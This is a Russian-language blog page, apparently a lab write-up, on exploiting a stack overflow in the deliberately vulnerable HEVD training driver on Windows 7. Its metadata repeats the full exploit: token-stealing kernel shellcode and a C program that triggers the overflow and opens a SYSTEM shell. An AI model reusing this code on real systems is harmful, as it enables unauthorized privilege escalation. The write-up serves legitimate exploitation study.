<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
  <meta name="generator" content="Jekyll">

  <title>Windows Kernel Exploitation 0x01 | Buffer Overflow [ru]</title>

  <link rel="stylesheet" href="/css/main.css">
  <!-- <link href="assets/favicon.ico" rel="icon" type="image/x-icon" /> -->
  <link rel="shortcut icon" type="image/png" href="assets//favicon.png">
  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Windows Kernel Exploitation 0x01 Buffer Overflow [ru] | Windows Internals Blog</title>
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="Windows Kernel Exploitation 0x01 Buffer Overflow [ru]" />
<meta name="author" content="truebad0ur" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Windows Exploitation Resources Windows Kernel Exploits Win Pwn Nixawk awesome windows exploitation Windows Exploitation Pathway Ссылочки Пара врайтапов на питоне, павершелле и на сях от хашерезады: python powershell c and python врайтап Хашерезады Собственно сорцы самого драйвера: HackSysExtremeVulnerableDriver Приступим Windows 7 x86 SP1 Код в конце Дебаг bp HEVD!TriggerStackOverflow bp HEVD!TriggerStackOverflow + 8f Выключен DEP + shellcode Computer --&gt; Properties --&gt; Advanced --&gt; Performance --&gt; Data Execution Prevention Сначала (переписав чужой код и собрав всё нужное вместе) я ошибся и в строке memcpy(&amp;expl[0x820], &amp;shellcode, 0x4); Использовал shellcode вместо shellc_ptr Разница в том, что shellcode объявлен в секции данных, которая, если я правильно понимаю, будет неисполняемой только в случае включённого DEP’а shellc_ptr же - это аллоцированная область в куче, в которой мы сами выставляем исполняемый бит и DEP тут ни при чём Всё сработало, эксплойт прокатил, но ошибку я заметил и решил поэкспериментировать HEVD!TriggerStackOverflow+0xc8: a7f616f2 c20800 ret 8 kd&gt; dd /c1 esp L3 ab679ab4 004040c0 ab679ab8 0022f680 ab679abc 00000824 Адрес в верхушке стека - место, где в секции даты лежит шеллкод Посмотрим на права на секции: kd&gt; !pte 004040c0 VA 004040c0 PDE at C0600010 PTE at C0002020 contains 0000000064979867 contains 8000000064853025 pfn 64979 ---DA--UWEV pfn 64853 ----A--UR-V Адрес очевидно в пространстве даты в процессе Исполняемого бита E на месте нету (в PTE) Шагаем дальше и всё исполняется Выключен DEP + shellc_ptr HEVD!TriggerStackOverflow+0xc8: a7f616f2 c20800 ret 8 kd&gt; dd /c1 esp L3 adfefab4 002c0000 adfefab8 0022f680 adfefabc 00000824 Очевидно, адрес уже из кучи Бит E стоит kd&gt; !pte 002c0000 VA 002c0000 PDE at C0600008 PTE at C0001600 contains 000000005BCE4867 contains 000000005BCC4867 pfn 5bce4 ---DA--UWEV pfn 5bcc4 ---DA--UWEV Включен DEP + shellcode kd&gt; dd /c1 esp L3 abeedab4 004040c0 abeedab8 0022f680 abeedabc 00000824 Адрес из даты Бита нету kd&gt; !pte 004040c0 VA 004040c0 PDE at C0600010 PTE at C0002020 contains 0000000051BD3867 contains 8000000051C05025 pfn 51bd3 ---DA--UWEV pfn 51c05 ----A--UR-V Сидим курим бамбук… kd&gt; t 004040c0 60 pushad kd&gt; t Access violation - code c0000005 (!!! second chance !!!) 004040c0 60 pushad Включен DEP + shellc_ptr Куча HEVD!TriggerStackOverflow+0xc8: aa35e6f2 c20800 ret 8 kd&gt; dd /c1 esp L3 ab163ab4 002c0000 ab163ab8 0022f680 ab163abc 00000824 Исполняемая kd&gt; !pte 002c0000 VA 002c0000 PDE at C0600008 PTE at C0001600 contains 0000000058F7E867 contains 000000005903D867 pfn 58f7e ---DA--UWEV pfn 5903d ---DA--UWEV Код shellcode.asm ; nasm -f bin shellcode.bin shellcode.asm [bits 32] ;FS:[0](_KPCR) --&gt; _KPCR+0x120 (PrcbData _KPRCB) --&gt; _KPRCB+0x4 (CurrentThread _KTHREAD) --&gt; _KTHREAD+0x40 (ApcState _KAPC_STATE) --&gt; _KAPC_STATE+0x10 (Process _KPROCESS) ;_EPROCESS.UniqueProcessId _EPROCESS+0xb4 ;_EPROCESS.ActiveProcessLinks _EPROCESS+0xb8 ;_EPROCESS.Token _EPROCESS+0xf8 section .text WIN7_SP1_SYS_PID equ 004h ; System PID in Windows 7 SP1 x86 WIN7_SP1_PID_OFFSET equ 0B4h ; nt!_EPROCESS.UniqueProcessId WIN7_SP1_TOKEN_OFFSET equ 0F8h ; nt!_EPROCESS.Token WIN7_SP1_FLINK_OFFSET equ 0B8h ; nt!_EPROCESS.ActiveProcessLinks.Flink WIN7_SP1_KTHREAD_OFFSET equ 124h ; nt!_KPCR.PcrbData.CurrentThread WIN7_SP1_EPROCESS_OFFSET equ 050h ; nt!_KTHREAD.ApcStateProcess global _start _start: pushad xor eax, eax ; Set ZERO mov eax, [fs:eax + WIN7_SP1_KTHREAD_OFFSET] ; Get nt!_KPCR.PcrbData.CurrentThread ; _KTHREAD is located at FS:[0x124] mov eax, [eax + WIN7_SP1_EPROCESS_OFFSET] ; Get nt!_KTHREAD.ApcState.Process mov ecx, eax ; Copy current thread&#39;s _EPROCESS structure mov edx, WIN7_SP1_SYS_PID ; System PID SearchSystemPID: mov eax, [eax + WIN7_SP1_FLINK_OFFSET] ; Get nt!_EPROCESS.ActiveProcessLinks.Flink sub eax, WIN7_SP1_FLINK_OFFSET cmp [eax + WIN7_SP1_PID_OFFSET], edx ; Compare nt!_EPROCESS.UniqueProcessId with pid in edx jne SearchSystemPID mov edx, [eax + WIN7_SP1_TOKEN_OFFSET] ; Get System process nt!_EPROCESS.Token mov [ecx + WIN7_SP1_TOKEN_OFFSET], edx ; Replace nt!_EPROCESS.Token with System&#39;s Token popad xor eax, eax ; Set NTSTATUS SUCCESS pop ebp ret 8 exploit.c #include &lt;Windows.h&gt; #include &lt;string.h&gt; #include &lt;stdio.h&gt; #define IO_CODE 0x222003 const char kDevName[] = &quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;; int main() { printf(&quot;[+] Calling CreateFileA() to obtain a handle to driver\n&quot;); HANDLE hDevice = CreateFileA(kDevName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL ); if (hDevice == INVALID_HANDLE_VALUE) { printf(&quot;[-] Error - dailed to get file handle!\n&quot;); system(&quot;pause&quot;); return -1; } printf(&quot;[+] Successfully obtained a handle to the driver\n&quot;); DWORD bytesRetn; char expl[0x824]; memset(expl, &#39;A&#39;, sizeof(expl)); char *shellcode = &quot;\x60\x31\xC0\x64\x8B\x80\x24\x01\x00\x00\x8B\x40\x50\x89\xC1\xBA\x04\x00\x00\x00\x8B\x80\xB8\x00\x00\x00\x2D\xB8\x00\x00\x00\x39\x90\xB4\x00\x00\x00\x75\xED\x8B\x90\xF8\x00\x00\x00\x89\x91\xF8\x00\x00\x00\x61\x31\xC0\x5D\xC2\x08\x00&quot;; LPVOID shellc_ptr = VirtualAlloc(0, 58, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (shellc_ptr) memcpy(shellc_ptr, shellcode, 58); memcpy(&amp;expl[0x820], &amp;shellc_ptr, 0x4); //memcpy(&amp;expl[0x820], &amp;shellcode, 0x4); //expl[0x820] = ((unsigned char *)(&amp;shellcode))[0]; //expl[0x821] = ((unsigned char *)(&amp;shellcode))[1]; //expl[0x822] = ((unsigned char *)(&amp;shellcode))[2]; //expl[0x823] = ((unsigned char *)(&amp;shellcode))[3]; printf(&quot;[+] Starting interaction with the driver\n&quot;); DeviceIoControl(hDevice, IO_CODE, expl, sizeof(expl), NULL, 0, &amp;bytesRetn, NULL); system(&quot;cmd.exe&quot;); CloseHandle(hDevice); return 0; }" />
<meta property="og:description" content="Windows Exploitation Resources Windows Kernel Exploits Win Pwn Nixawk awesome windows exploitation Windows Exploitation Pathway Ссылочки Пара врайтапов на питоне, павершелле и на сях от хашерезады: python powershell c and python врайтап Хашерезады Собственно сорцы самого драйвера: HackSysExtremeVulnerableDriver Приступим Windows 7 x86 SP1 Код в конце Дебаг bp HEVD!TriggerStackOverflow bp HEVD!TriggerStackOverflow + 8f Выключен DEP + shellcode Computer --&gt; Properties --&gt; Advanced --&gt; Performance --&gt; Data Execution Prevention Сначала (переписав чужой код и собрав всё нужное вместе) я ошибся и в строке memcpy(&amp;expl[0x820], &amp;shellcode, 0x4); Использовал shellcode вместо shellc_ptr Разница в том, что shellcode объявлен в секции данных, которая, если я правильно понимаю, будет неисполняемой только в случае включённого DEP’а shellc_ptr же - это аллоцированная область в куче, в которой мы сами выставляем исполняемый бит и DEP тут ни при чём Всё сработало, эксплойт прокатил, но ошибку я заметил и решил поэкспериментировать HEVD!TriggerStackOverflow+0xc8: a7f616f2 c20800 ret 8 kd&gt; dd /c1 esp L3 ab679ab4 004040c0 ab679ab8 0022f680 ab679abc 00000824 Адрес в верхушке стека - место, где в секции даты лежит шеллкод Посмотрим на права на секции: kd&gt; !pte 004040c0 VA 004040c0 PDE at C0600010 PTE at C0002020 contains 0000000064979867 contains 8000000064853025 pfn 64979 ---DA--UWEV pfn 64853 ----A--UR-V Адрес очевидно в пространстве даты в процессе Исполняемого бита E на месте нету (в PTE) Шагаем дальше и всё исполняется Выключен DEP + shellc_ptr HEVD!TriggerStackOverflow+0xc8: a7f616f2 c20800 ret 8 kd&gt; dd /c1 esp L3 adfefab4 002c0000 adfefab8 0022f680 adfefabc 00000824 Очевидно, адрес уже из кучи Бит E стоит kd&gt; !pte 002c0000 VA 002c0000 PDE at C0600008 PTE at C0001600 contains 000000005BCE4867 contains 000000005BCC4867 pfn 5bce4 ---DA--UWEV pfn 5bcc4 ---DA--UWEV Включен DEP + shellcode kd&gt; dd /c1 esp L3 abeedab4 004040c0 abeedab8 0022f680 abeedabc 00000824 Адрес из даты Бита нету kd&gt; !pte 004040c0 VA 004040c0 PDE at C0600010 PTE at C0002020 contains 0000000051BD3867 contains 8000000051C05025 pfn 51bd3 ---DA--UWEV pfn 51c05 ----A--UR-V Сидим курим бамбук… kd&gt; t 004040c0 60 pushad kd&gt; t Access violation - code c0000005 (!!! second chance !!!) 004040c0 60 pushad Включен DEP + shellc_ptr Куча HEVD!TriggerStackOverflow+0xc8: aa35e6f2 c20800 ret 8 kd&gt; dd /c1 esp L3 ab163ab4 002c0000 ab163ab8 0022f680 ab163abc 00000824 Исполняемая kd&gt; !pte 002c0000 VA 002c0000 PDE at C0600008 PTE at C0001600 contains 0000000058F7E867 contains 000000005903D867 pfn 58f7e ---DA--UWEV pfn 5903d ---DA--UWEV Код shellcode.asm ; nasm -f bin shellcode.bin shellcode.asm [bits 32] ;FS:[0](_KPCR) --&gt; _KPCR+0x120 (PrcbData _KPRCB) --&gt; _KPRCB+0x4 (CurrentThread _KTHREAD) --&gt; _KTHREAD+0x40 (ApcState _KAPC_STATE) --&gt; _KAPC_STATE+0x10 (Process _KPROCESS) ;_EPROCESS.UniqueProcessId _EPROCESS+0xb4 ;_EPROCESS.ActiveProcessLinks _EPROCESS+0xb8 ;_EPROCESS.Token _EPROCESS+0xf8 section .text WIN7_SP1_SYS_PID equ 004h ; System PID in Windows 7 SP1 x86 WIN7_SP1_PID_OFFSET equ 0B4h ; nt!_EPROCESS.UniqueProcessId WIN7_SP1_TOKEN_OFFSET equ 0F8h ; nt!_EPROCESS.Token WIN7_SP1_FLINK_OFFSET equ 0B8h ; nt!_EPROCESS.ActiveProcessLinks.Flink WIN7_SP1_KTHREAD_OFFSET equ 124h ; nt!_KPCR.PcrbData.CurrentThread WIN7_SP1_EPROCESS_OFFSET equ 050h ; nt!_KTHREAD.ApcStateProcess global _start _start: pushad xor eax, eax ; Set ZERO mov eax, [fs:eax + WIN7_SP1_KTHREAD_OFFSET] ; Get nt!_KPCR.PcrbData.CurrentThread ; _KTHREAD is located at FS:[0x124] mov eax, [eax + WIN7_SP1_EPROCESS_OFFSET] ; Get nt!_KTHREAD.ApcState.Process mov ecx, eax ; Copy current thread&#39;s _EPROCESS structure mov edx, WIN7_SP1_SYS_PID ; System PID SearchSystemPID: mov eax, [eax + WIN7_SP1_FLINK_OFFSET] ; Get nt!_EPROCESS.ActiveProcessLinks.Flink sub eax, WIN7_SP1_FLINK_OFFSET cmp [eax + WIN7_SP1_PID_OFFSET], edx ; Compare nt!_EPROCESS.UniqueProcessId with pid in edx jne SearchSystemPID mov edx, [eax + WIN7_SP1_TOKEN_OFFSET] ; Get System process nt!_EPROCESS.Token mov [ecx + WIN7_SP1_TOKEN_OFFSET], edx ; Replace nt!_EPROCESS.Token with System&#39;s Token popad xor eax, eax ; Set NTSTATUS SUCCESS pop ebp ret 8 exploit.c #include &lt;Windows.h&gt; #include &lt;string.h&gt; #include &lt;stdio.h&gt; #define IO_CODE 0x222003 const char kDevName[] = &quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;; int main() { printf(&quot;[+] Calling CreateFileA() to obtain a handle to driver\n&quot;); HANDLE hDevice = CreateFileA(kDevName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL ); if (hDevice == INVALID_HANDLE_VALUE) { printf(&quot;[-] Error - dailed to get file handle!\n&quot;); system(&quot;pause&quot;); return -1; } printf(&quot;[+] Successfully obtained a handle to the driver\n&quot;); DWORD bytesRetn; char expl[0x824]; memset(expl, &#39;A&#39;, sizeof(expl)); char *shellcode = &quot;\x60\x31\xC0\x64\x8B\x80\x24\x01\x00\x00\x8B\x40\x50\x89\xC1\xBA\x04\x00\x00\x00\x8B\x80\xB8\x00\x00\x00\x2D\xB8\x00\x00\x00\x39\x90\xB4\x00\x00\x00\x75\xED\x8B\x90\xF8\x00\x00\x00\x89\x91\xF8\x00\x00\x00\x61\x31\xC0\x5D\xC2\x08\x00&quot;; LPVOID shellc_ptr = VirtualAlloc(0, 58, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (shellc_ptr) memcpy(shellc_ptr, shellcode, 58); memcpy(&amp;expl[0x820], &amp;shellc_ptr, 0x4); //memcpy(&amp;expl[0x820], &amp;shellcode, 0x4); //expl[0x820] = ((unsigned char *)(&amp;shellcode))[0]; //expl[0x821] = ((unsigned char *)(&amp;shellcode))[1]; //expl[0x822] = ((unsigned char *)(&amp;shellcode))[2]; //expl[0x823] = ((unsigned char *)(&amp;shellcode))[3]; printf(&quot;[+] Starting interaction with the driver\n&quot;); DeviceIoControl(hDevice, IO_CODE, expl, sizeof(expl), NULL, 0, &amp;bytesRetn, NULL); system(&quot;cmd.exe&quot;); CloseHandle(hDevice); return 0; }" />
<meta property="og:site_name" content="Windows Internals Blog" />
<meta property="og:image" content="/assets/previews/7.jpg" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-09-19T00:00:00+00:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="/assets/previews/7.jpg" />
<meta property="twitter:title" content="Windows Kernel Exploitation 0x01 Buffer Overflow [ru]" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"truebad0ur"},"dateModified":"2022-09-19T00:00:00+00:00","datePublished":"2022-09-19T00:00:00+00:00","description":"Windows Exploitation Resources Windows Kernel Exploits Win Pwn Nixawk awesome windows exploitation Windows Exploitation Pathway Ссылочки Пара врайтапов на питоне, павершелле и на сях от хашерезады: python powershell c and python врайтап Хашерезады Собственно сорцы самого драйвера: HackSysExtremeVulnerableDriver Приступим Windows 7 x86 SP1 Код в конце Дебаг bp HEVD!TriggerStackOverflow bp HEVD!TriggerStackOverflow + 8f Выключен DEP + shellcode Computer --&gt; Properties --&gt; Advanced --&gt; Performance --&gt; Data Execution Prevention Сначала (переписав чужой код и собрав всё нужное вместе) я ошибся и в строке memcpy(&amp;expl[0x820], &amp;shellcode, 0x4); Использовал shellcode вместо shellc_ptr Разница в том, что shellcode объявлен в секции данных, которая, если я правильно понимаю, будет неисполняемой только в случае включённого DEP’а shellc_ptr же - это аллоцированная область в куче, в которой мы сами выставляем исполняемый бит и DEP тут ни при чём Всё сработало, эксплойт прокатил, но ошибку я заметил и решил поэкспериментировать HEVD!TriggerStackOverflow+0xc8: a7f616f2 c20800 ret 8 kd&gt; dd /c1 esp L3 ab679ab4 004040c0 ab679ab8 0022f680 ab679abc 00000824 Адрес в верхушке стека - место, где в секции даты лежит шеллкод Посмотрим на права на секции: kd&gt; !pte 004040c0 VA 004040c0 PDE at C0600010 PTE at C0002020 contains 0000000064979867 contains 8000000064853025 pfn 64979 ---DA--UWEV pfn 64853 ----A--UR-V Адрес очевидно в пространстве даты в процессе Исполняемого бита E на месте нету (в PTE) Шагаем дальше и всё исполняется Выключен DEP + shellc_ptr HEVD!TriggerStackOverflow+0xc8: a7f616f2 c20800 ret 8 kd&gt; dd /c1 esp L3 adfefab4 002c0000 adfefab8 0022f680 adfefabc 00000824 Очевидно, адрес уже из кучи Бит E стоит kd&gt; !pte 002c0000 VA 002c0000 PDE at C0600008 PTE at C0001600 contains 000000005BCE4867 contains 000000005BCC4867 pfn 5bce4 ---DA--UWEV pfn 5bcc4 ---DA--UWEV Включен DEP + shellcode kd&gt; dd /c1 esp L3 abeedab4 004040c0 abeedab8 0022f680 abeedabc 00000824 Адрес из даты Бита нету kd&gt; !pte 004040c0 VA 004040c0 PDE at C0600010 PTE at C0002020 contains 0000000051BD3867 contains 8000000051C05025 pfn 51bd3 ---DA--UWEV pfn 51c05 ----A--UR-V Сидим курим бамбук… kd&gt; t 004040c0 60 pushad kd&gt; t Access violation - code c0000005 (!!! second chance !!!) 004040c0 60 pushad Включен DEP + shellc_ptr Куча HEVD!TriggerStackOverflow+0xc8: aa35e6f2 c20800 ret 8 kd&gt; dd /c1 esp L3 ab163ab4 002c0000 ab163ab8 0022f680 ab163abc 00000824 Исполняемая kd&gt; !pte 002c0000 VA 002c0000 PDE at C0600008 PTE at C0001600 contains 0000000058F7E867 contains 000000005903D867 pfn 58f7e ---DA--UWEV pfn 5903d ---DA--UWEV Код shellcode.asm ; nasm -f bin shellcode.bin shellcode.asm [bits 32] ;FS:[0](_KPCR) --&gt; _KPCR+0x120 (PrcbData _KPRCB) --&gt; _KPRCB+0x4 (CurrentThread _KTHREAD) --&gt; _KTHREAD+0x40 (ApcState _KAPC_STATE) --&gt; _KAPC_STATE+0x10 (Process _KPROCESS) ;_EPROCESS.UniqueProcessId _EPROCESS+0xb4 ;_EPROCESS.ActiveProcessLinks _EPROCESS+0xb8 ;_EPROCESS.Token _EPROCESS+0xf8 section .text WIN7_SP1_SYS_PID equ 004h ; System PID in Windows 7 SP1 x86 WIN7_SP1_PID_OFFSET equ 0B4h ; nt!_EPROCESS.UniqueProcessId WIN7_SP1_TOKEN_OFFSET equ 0F8h ; nt!_EPROCESS.Token WIN7_SP1_FLINK_OFFSET equ 0B8h ; nt!_EPROCESS.ActiveProcessLinks.Flink WIN7_SP1_KTHREAD_OFFSET equ 124h ; nt!_KPCR.PcrbData.CurrentThread WIN7_SP1_EPROCESS_OFFSET equ 050h ; nt!_KTHREAD.ApcStateProcess global _start _start: pushad xor eax, eax ; Set ZERO mov eax, [fs:eax + WIN7_SP1_KTHREAD_OFFSET] ; Get nt!_KPCR.PcrbData.CurrentThread ; _KTHREAD is located at FS:[0x124] mov eax, [eax + WIN7_SP1_EPROCESS_OFFSET] ; Get nt!_KTHREAD.ApcState.Process mov ecx, eax ; Copy current thread&#39;s _EPROCESS structure mov edx, WIN7_SP1_SYS_PID ; System PID SearchSystemPID: mov eax, [eax + WIN7_SP1_FLINK_OFFSET] ; Get nt!_EPROCESS.ActiveProcessLinks.Flink sub eax, WIN7_SP1_FLINK_OFFSET cmp [eax + WIN7_SP1_PID_OFFSET], edx ; Compare nt!_EPROCESS.UniqueProcessId with pid in edx jne SearchSystemPID mov edx, [eax + WIN7_SP1_TOKEN_OFFSET] ; Get System process nt!_EPROCESS.Token mov [ecx + WIN7_SP1_TOKEN_OFFSET], edx ; Replace nt!_EPROCESS.Token with System&#39;s Token popad xor eax, eax ; Set NTSTATUS SUCCESS pop ebp ret 8 exploit.c #include &lt;Windows.h&gt; #include &lt;string.h&gt; #include &lt;stdio.h&gt; #define IO_CODE 0x222003 const char kDevName[] = &quot;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver&quot;; int main() { printf(&quot;[+] Calling CreateFileA() to obtain a handle to driver\\n&quot;); HANDLE hDevice = CreateFileA(kDevName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL ); if (hDevice == INVALID_HANDLE_VALUE) { printf(&quot;[-] Error - dailed to get file handle!\\n&quot;); system(&quot;pause&quot;); return -1; } printf(&quot;[+] Successfully obtained a handle to the driver\\n&quot;); DWORD bytesRetn; char expl[0x824]; memset(expl, &#39;A&#39;, sizeof(expl)); char *shellcode = &quot;\\x60\\x31\\xC0\\x64\\x8B\\x80\\x24\\x01\\x00\\x00\\x8B\\x40\\x50\\x89\\xC1\\xBA\\x04\\x00\\x00\\x00\\x8B\\x80\\xB8\\x00\\x00\\x00\\x2D\\xB8\\x00\\x00\\x00\\x39\\x90\\xB4\\x00\\x00\\x00\\x75\\xED\\x8B\\x90\\xF8\\x00\\x00\\x00\\x89\\x91\\xF8\\x00\\x00\\x00\\x61\\x31\\xC0\\x5D\\xC2\\x08\\x00&quot;; LPVOID shellc_ptr = VirtualAlloc(0, 58, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (shellc_ptr) memcpy(shellc_ptr, shellcode, 58); memcpy(&amp;expl[0x820], &amp;shellc_ptr, 0x4); //memcpy(&amp;expl[0x820], &amp;shellcode, 0x4); //expl[0x820] = ((unsigned char *)(&amp;shellcode))[0]; //expl[0x821] = ((unsigned char *)(&amp;shellcode))[1]; //expl[0x822] = ((unsigned char *)(&amp;shellcode))[2]; //expl[0x823] = ((unsigned char *)(&amp;shellcode))[3]; printf(&quot;[+] Starting interaction with the driver\\n&quot;); DeviceIoControl(hDevice, IO_CODE, expl, sizeof(expl), NULL, 0, &amp;bytesRetn, NULL); system(&quot;cmd.exe&quot;); CloseHandle(hDevice); return 0; }","headline":"Windows Kernel Exploitation 0x01 Buffer Overflow [ru]","image":"/assets/previews/7.jpg","mainEntityOfPage":{"@type":"WebPage","@id":"/2022/09/19/Windows-Kernel-Exploitation-0x01.html"},"url":"/2022/09/19/Windows-Kernel-Exploitation-0x01.html"}</script>
<!-- End Jekyll SEO tag -->

</head>

<link href="assets/favicon.ico" rel="icon" type="image/x-icon" />

<body>
  <div id="wrapper">
    <header>
  <div>
    <a href="/">
    <link rel="shortcut icon" href="/assets/favicon.ico">
    
    <h1>truebad0ur@home:~$</h1>
    </a>
    <div class="header-links">
      <a href="/archive.html"><h2 class="header-link">Archive</h2></a>
<a href="/about.html"><h2 class="header-link">About</h2></a>
<a href="/ToDo.html"><h2 class="header-link">ToDo</h2></a>
<a href="/Certificates.html"><h2 class="header-link">Certificates</h2></a>
<!--<a href="https://t.me/reverse_dungeon"><h2 class="header-link">Telegram</h2></a>-->

    </div>
  </div>
</header>

    <div class="container">
      <section id="main_content">
        <article>
  <p><a href="https://github.com/FULLSHADE/WindowsExploitationResources">Windows Exploitation Resources</a></p>

<p><a href="https://github.com/SecWiki/windows-kernel-exploits">Windows Kernel Exploits</a></p>

<p><a href="https://github.com/leesh3288/WinPwn">Win Pwn</a></p>

<p><a href="https://github.com/r3p3r/nixawk-awesome-windows-exploitation">Nixawk awesome windows exploitation</a></p>

<p><a href="https://web.archive.org/web/20200506122824/https://fullpwnops.com/windows-exploitation-pathway.html">Windows Exploitation Pathway</a></p>

<h3 id="ссылочки"><a href="#header-3"></a>Ссылочки</h3>

<p>Пара врайтапов на питоне, павершелле и на сях от хашерезады:</p>

<p><a href="https://rootkits.xyz/blog/2017/08/kernel-stack-overflow">python</a></p>

<p><a href="https://www.fuzzysecurity.com/tutorials/expDev/14.html">powershell</a></p>

<p><a href="https://jb05s.github.io/HEVD-Driver-Exploitation-Part-2-Stack-Overflow-Presented-in-Python-and-C/">c and python</a></p>

<p><a href="https://github.com/hasherezade/wke_exercises/blob/master/stackoverflow_expl/main.cpp">врайтап Хашерезады</a></p>

<p>Собственно сорцы самого драйвера:</p>

<p><a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/tree/643f39023bda9254e5cfd3534f4222c00d89088b">HackSysExtremeVulnerableDriver</a></p>

<h3 id="приступим"><a href="#header-3"></a>Приступим</h3>

<ul>
  <li>Windows 7 x86 SP1</li>
  <li>Код в конце</li>
  <li>Дебаг</li>
  <li>
    <ul>
      <li>bp HEVD!TriggerStackOverflow</li>
    </ul>
  </li>
  <li>
    <ul>
      <li>bp HEVD!TriggerStackOverflow + 8f</li>
    </ul>
  </li>
</ul>

<h3 id="выключен-dep--shellcode"><a href="#header-3"></a>Выключен DEP + shellcode</h3>

<p><code class="language-plaintext highlighter-rouge">Computer --&gt; Properties --&gt; Advanced --&gt; Performance --&gt; Data Execution Prevention</code></p>

<p>Сначала (переписав чужой код и собрав всё нужное вместе) я ошибся и в строке <code class="language-plaintext highlighter-rouge">memcpy(&amp;expl[0x820], &amp;shellcode, 0x4);</code></p>

<p>Использовал shellcode вместо shellc_ptr</p>

<p>Разница в том, что shellcode объявлен в секции данных, которая, если я правильно понимаю, будет неисполняемой только в случае включённого DEP’а</p>

<p>shellc_ptr же - это аллоцированная область в куче, в которой мы сами выставляем исполняемый бит и DEP тут ни при чём</p>

<p>Всё сработало, эксплойт прокатил, но ошибку я заметил и решил поэкспериментировать</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">HEVD</span><span class="o">!</span><span class="nx">TriggerStackOverflow</span><span class="o">+</span><span class="mh">0xc8</span><span class="p">:</span>
<span class="nx">a7f616f2</span> <span class="nx">c20800</span> <span class="nx">ret</span> <span class="mi">8</span>
<span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">dd</span> <span class="o">/</span><span class="nx">c1</span> <span class="nx">esp</span> <span class="nx">L3</span>
    <span class="nx">ab679ab4</span> <span class="mi">004040</span><span class="nx">c0</span>
    <span class="nx">ab679ab8</span> <span class="mi">0022</span><span class="nx">f680</span>
    <span class="nx">ab679abc</span> <span class="mi">00000824</span>
</code></pre></div></div>

<p>Адрес в верхушке стека - место, где в секции даты лежит шеллкод
Посмотрим на права на секции:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">kd</span><span class="o">&gt;</span> <span class="o">!</span><span class="nx">pte</span> <span class="mi">004040</span><span class="nx">c0</span>
                    <span class="nx">VA</span> <span class="mi">004040</span><span class="nx">c0</span>
<span class="nx">PDE</span> <span class="nx">at</span> <span class="nx">C0600010</span>            <span class="nx">PTE</span> <span class="nx">at</span> <span class="nx">C0002020</span>
<span class="nx">contains</span> <span class="mi">0000000064979867</span>  <span class="nx">contains</span> <span class="mi">8000000064853025</span>
<span class="nx">pfn</span> <span class="mi">64979</span>     <span class="o">---</span><span class="nx">DA</span><span class="o">--</span><span class="nx">UWEV</span>  <span class="nx">pfn</span> <span class="mi">64853</span>     <span class="o">----</span><span class="nx">A</span><span class="o">--</span><span class="nx">UR</span><span class="o">-</span><span class="nx">V</span>
</code></pre></div></div>

<p>Адрес очевидно в пространстве даты в процессе
Исполняемого бита E на месте нету (в PTE)</p>

<p>Шагаем дальше и всё исполняется</p>

<h3 id="выключен-dep--shellc_ptr"><a href="#header-3"></a>Выключен DEP + shellc_ptr</h3>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">HEVD</span><span class="o">!</span><span class="nx">TriggerStackOverflow</span><span class="o">+</span><span class="mh">0xc8</span><span class="p">:</span>
<span class="nx">a7f616f2</span> <span class="nx">c20800</span>          <span class="nx">ret</span>     <span class="mi">8</span>
<span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">dd</span> <span class="o">/</span><span class="nx">c1</span> <span class="nx">esp</span> <span class="nx">L3</span>
    <span class="nx">adfefab4</span>  <span class="mi">002</span><span class="nx">c0000</span>
    <span class="nx">adfefab8</span>  <span class="mi">0022</span><span class="nx">f680</span>
    <span class="nx">adfefabc</span>  <span class="mi">00000824</span>
</code></pre></div></div>

<p>Очевидно, адрес уже из кучи
Бит E стоит</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">kd</span><span class="o">&gt;</span> <span class="o">!</span><span class="nx">pte</span> <span class="mi">002</span><span class="nx">c0000</span>
                    <span class="nx">VA</span> <span class="mi">002</span><span class="nx">c0000</span>
<span class="nx">PDE</span> <span class="nx">at</span> <span class="nx">C0600008</span>            <span class="nx">PTE</span> <span class="nx">at</span> <span class="nx">C0001600</span>
<span class="nx">contains</span> <span class="mi">000000005</span><span class="nx">BCE4867</span>  <span class="nx">contains</span> <span class="mi">000000005</span><span class="nx">BCC4867</span>
<span class="nx">pfn</span> <span class="mi">5</span><span class="nx">bce4</span>     <span class="o">---</span><span class="nx">DA</span><span class="o">--</span><span class="nx">UWEV</span>  <span class="nx">pfn</span> <span class="mi">5</span><span class="nx">bcc4</span>     <span class="o">---</span><span class="nx">DA</span><span class="o">--</span><span class="nx">UWEV</span>
</code></pre></div></div>

<h3 id="включен-dep--shellcode"><a href="#header-3"></a>Включен DEP + shellcode</h3>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">dd</span> <span class="o">/</span><span class="nx">c1</span> <span class="nx">esp</span> <span class="nx">L3</span>
    <span class="nx">abeedab4</span>  <span class="mi">004040</span><span class="nx">c0</span>
    <span class="nx">abeedab8</span>  <span class="mi">0022</span><span class="nx">f680</span>
